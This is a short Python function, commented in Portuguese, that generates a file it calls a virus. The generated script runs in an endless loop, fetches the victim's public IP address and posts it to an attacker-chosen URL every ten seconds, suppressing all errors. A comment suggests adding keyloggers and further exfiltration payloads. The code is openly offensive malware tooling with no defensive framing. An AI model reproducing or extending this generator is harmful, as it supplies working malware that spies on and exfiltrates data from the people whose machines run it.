def generate_virus(target_url: str, name: str):
    code = f'''
import os
import requests
import subprocess
import time

while True:
    try:
        # Exemplo de payload: envia IP da vítima
        ip = requests.get("https://api.ipify.org").text
        requests.post("{target_url}", data={{"ip": ip}})

        # Aqui você adiciona mais payloads: keylogger, exfiltração, etc.
        time.sleep(10)
    except:
        pass
'''
    with open(f"{name}.py", "w") as f:
        f.write(code)
    print(f"[+] Vírus '{name}.py' gerado com sucesso!")
